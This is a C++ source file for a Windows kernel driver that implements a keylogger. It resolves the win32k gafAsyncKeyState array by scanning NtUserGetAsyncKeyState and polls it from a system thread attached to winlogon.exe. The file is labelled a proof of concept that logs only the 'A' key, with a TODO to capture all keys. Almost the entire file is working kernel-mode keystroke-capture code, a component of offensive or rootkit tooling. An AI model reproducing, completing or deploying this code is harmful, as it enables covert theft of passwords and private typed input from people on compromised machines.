#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"
#include "DriverMeta.hpp"

#define MOV_RAX_QWORD_BYTE1 0x48
#define MOV_RAX_QWORD_BYTE2 0x8B
#define MOV_RAX_QWORD_BYTE3 0x05

// https://github.com/mirror/reactos/blob/c6d2b35ffc91e09f50dfb214ea58237509329d6b/reactos/win32ss/user/ntuser/input.h#L91
#define GET_KS_BYTE(vk) ((vk) * 2 / 8)
#define GET_KS_DOWN_BIT(vk) (1 << (((vk) % 4)*2))
#define GET_KS_LOCK_BIT(vk) (1 << (((vk) % 4)*2 + 1))
#define IS_KEY_DOWN(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_DOWN_BIT(vk)) ? TRUE : FALSE)
#define IS_KEY_LOCKED(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_LOCK_BIT(vk)) ? TRUE : FALSE)
#define SET_KEY_DOWN(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                            ((ks)[GET_KS_BYTE(vk)] | GET_KS_DOWN_BIT(vk)) : \
                                                            ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_DOWN_BIT(vk)))
#define SET_KEY_LOCKED(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                              ((ks)[GET_KS_BYTE(vk)] | GET_KS_LOCK_BIT(vk)) : \
                                                              ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_LOCK_BIT(vk)))

#define VK_A 0x41

UINT8 keyStateMap[64] = { 0 };
UINT8 keyPreviousStateMap[64] = { 0 };
UINT8 keyRecentStateMap[64] = { 0 };

/**
 * Read the contents of gafAsyncKeyStateAddr into keyStateMap. 
 */
VOID
BeUpdateKeyStateMap(const HANDLE& procId, const PVOID& gafAsyncKeyStateAddr)
{
	memcpy(keyPreviousStateMap, keyStateMap, 64);

	SIZE_T size = 0;
	BeGlobals::pMmCopyVirtualMemory(
		BeGetEprocessByPid(HandleToULong(procId)),
		gafAsyncKeyStateAddr,
		PsGetCurrentProcess(), 
		&keyStateMap,
		sizeof(UINT8[64]),
		KernelMode,
		&size
	);

	for (auto vk = 0u; vk < 256; ++vk) 
	{
		// if key is down but wasnt previously, set it in the recent state as down
		if (IS_KEY_DOWN(keyStateMap, vk) && !(IS_KEY_DOWN(keyPreviousStateMap, vk)))
		{
			SET_KEY_DOWN(keyRecentStateMap, vk, TRUE);
		}
	}
}

/**
 * Check if the key was pressed since the last call to this function
 * 
 * @param UINT8 virtual key code
 * @return BOOLEAN TRUE if the key was pressed, else FALSE
 */
BOOLEAN
BeWasKeyPressed(UINT8 vk)
{
	BOOLEAN result = IS_KEY_DOWN(keyRecentStateMap, vk);
	SET_KEY_DOWN(keyRecentStateMap, vk, FALSE);
	return result;
}

/**
 * Get the address of gafAsyncKeyState
 * 
 * @returns UINT64 address of gafAsyncKeyState
 */
PVOID
BeGetGafAsyncKeyStateAddress(PEPROCESS targetProc)
{
	// TODO FIXME: THIS IS WINDOWS <= 10 ONLY

	KAPC_STATE apc;

	// Get Address of NtUserGetAsyncKeyState
	DWORD64 ntUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress(Win32kBase, "NtUserGetAsyncKeyState");
	LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", ntUserGetAsyncKeyState);

	KeStackAttachProcess(targetProc, &apc);

	PVOID address = 0;
	INT i = 0;

	// Resolve gafAsyncKeyState address
	for (; i < 500; ++i)
	{
		if (
			*(BYTE*)(ntUserGetAsyncKeyState + i) == MOV_RAX_QWORD_BYTE1
			&& *(BYTE*)(ntUserGetAsyncKeyState + i + 1) == MOV_RAX_QWORD_BYTE2 
			&& *(BYTE*)(ntUserGetAsyncKeyState + i + 2) == MOV_RAX_QWORD_BYTE3
		)
		{
			// param for MOV RAX QWORD PTR is the offset to the address of gafAsyncKeyState
			UINT32 offset = (*(PUINT32)(ntUserGetAsyncKeyState + i + 3));
			address = (PVOID)(ntUserGetAsyncKeyState + i + 3 + 4 + offset); // 4 = length of offset value
			LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), offset);
			break;
		}
	}

	if (address == 0)
	{
		LOG_MSG("Could not resolve gafAsyncKeyState...\n");
	}
	else
	{
		LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", i, address);
	}

	KeUnstackDetachProcess(&apc);
	return address;
}

/**
 * Thread function that runs a keylogger in the background, directly reading from gafAsyncKeyStateAddress
 */
VOID
BeKeyLoggerFunction(IN PVOID StartContext)
{
	UNREFERENCED_PARAMETER(StartContext);

	// To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session // TODO refactor to dedicated function
	// https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
	KAPC_STATE apc;
	PEPROCESS targetProc = 0;
	UNICODE_STRING processName;
	RtlInitUnicodeString(&processName, L"winlogon.exe");
	HANDLE procId = BeGetPidFromProcessName(processName); 
	LOG_MSG("Found winlogon PID: %i\n", procId);
	if (PsLookupProcessByProcessId(procId, &targetProc) != 0)
	{
		ObDereferenceObject(targetProc);
		PsTerminateSystemThread(STATUS_NOT_FOUND);
		return;
	}

	PVOID gasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress(targetProc);

	while (BeGlobals::runKeyLogger)
	{
		BeUpdateKeyStateMap(procId, gasAsyncKeyStateAddr);

		// POC: just check for A. TODO: log all keys
		if (BeWasKeyPressed(0x41))
		{
			LOG_MSG("A pressed\n");
		}

		// Sleep for 0.1 seconds
		LARGE_INTEGER interval;
		interval.QuadPart = -1 * (LONGLONG)100 * 10000; 
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}

	ObDereferenceObject(targetProc);
	PsTerminateSystemThread(STATUS_SUCCESS);
}
 